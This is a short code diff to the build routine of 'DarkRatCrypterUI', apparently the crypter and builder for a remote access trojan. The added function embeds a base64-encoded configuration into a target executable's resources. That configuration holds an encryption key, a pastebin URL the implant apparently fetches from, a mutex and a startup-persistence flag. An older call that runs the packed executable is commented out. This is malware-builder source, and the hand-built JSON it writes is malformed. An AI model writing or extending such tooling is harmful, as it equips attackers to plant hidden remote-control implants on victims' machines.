@@ -52,6 +52,15 @@ void DarkRatCrypterUI::on_gen_enckey_clicked()
 	ui.encryptionkey->setText(QString::fromStdString(random_string(5)));
 }
 
+
+void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
+{
+	HANDLE hResource = NULL;
+	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
+	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
+	EndUpdateResource(hResource, FALSE);
+}
+
 void DarkRatCrypterUI::on_build_clicked()
 {
 	
@@ -73,9 +82,15 @@ void DarkRatCrypterUI::on_build_clicked()
 
 	//MessageBox(NULL, TEXT("Open the message box1 "), , MB_OK | MB_SYSTEMMODAL);
 
+
+	std::string json = "{ { \"ek\", "+ encryptionKey +"} ,{ \"pu\", "+ pastebinURl+" },{ \"mux\", "+mutex+" },{ \"sup\", "+ startup +" },{ \"ri\", 5 },{ \"pn\", {\"FOO\", \"BAR\"} } }";
 	
-	int status = RunPortableExecutable(rawData, buildString);
+	QString b64string = QString::fromStdString(json).toUtf8().toBase64();
+	std::string write = b64string.toStdString();
+	char* c_write = &write[0u];
+	WriteToResources("test.exe", 10, (BYTE*)c_write, strlen(c_write));
+	//int status = RunPortableExecutable(rawData, buildString);
 	
-	ui.statusBar->showMessage(QString::fromStdString(buildString)  +" successfully builded!"+ status, 1000);
+//	ui.statusBar->showMessage(QString::fromStdString(doc.toJson()) , 1000);
 	
 }
